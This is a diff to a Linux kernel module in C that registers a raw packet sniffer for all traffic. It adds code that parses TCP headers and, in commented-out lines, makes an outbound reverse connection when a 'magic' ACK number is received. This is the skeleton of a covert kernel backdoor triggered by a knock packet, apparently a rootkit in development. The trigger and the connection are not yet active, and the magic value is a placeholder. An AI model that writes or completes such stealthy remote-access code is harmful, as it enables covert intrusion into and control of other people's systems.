@@ -158,10 +158,47 @@ static struct notifier_block nb =
 };
 
 
+void reverse_connect(void)
+{
+	/* Use after receiving the "magic" ACK number. */
+	/**
+	printk("Attempting to connect to server [expected not to].\n");
+	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
+		printk("Could not connect [expected].\n");
+	else
+		printk("Connected to server.\n");
+	**/
+}
+
+
 int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	struct packet_type *ptype, struct net_device *orig_dev)
 {
+	struct tcphdr *tcp_header;
+	struct iphdr  *ip_header;
+
+	unsigned long int ack_seq;
+	unsigned long int seq;
+	
 	printk("One packet received.\n");
+	ip_header = (struct iphdr *)skb_network_header(skb);
+
+	if (ip_header->protocol == IPPROTO_TCP)
+	{
+		printk("Was a TCP packet.\n");
+		tcp_header = (struct tcphdr *) ((unsigned int *) ip_header + ip_header->ihl);
+
+		ack_seq = ntohl(tcp_header->ack_seq);
+		seq     = ntohl(tcp_header->seq);
+		printk("ack_seq: %lu\n", ack_seq);
+		printk("seq:     %lu\n", seq);
+
+		/* Use after magic 'ACK' was received. Decide on magic 'ACK'. */
+		/**
+		if (ack_seq == [MAGIC_ACK])
+			reverse_connect();
+		**/
+	}
 
 	kfree_skb(skb);
 	return 0;
@@ -175,24 +212,11 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 **/
 int start_listen(void *args)
 {
-	/* Use after receiving the "magic" ACK number. */
-	/**
-	printk("Attempting to connect to server [expected not to].\n");
-	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
-		printk("Could not connect [expected].\n");
-	else
-		printk("Connected to server.\n");
-	**/
 	printk("Starting network sniffing.\n");
 	net_proto.type = htons(ETH_P_ALL);
 	net_proto.dev  = NULL;
 	net_proto.func = packet_rcv;
 	dev_add_pack(&net_proto);
-
-	if (sock)
-		printk("Initialized.\n");
-	else
-		printk("Nope.\n");
 
 	printk("Stopping network-listening thread.\n");
 	kthread_stop(net_thread);
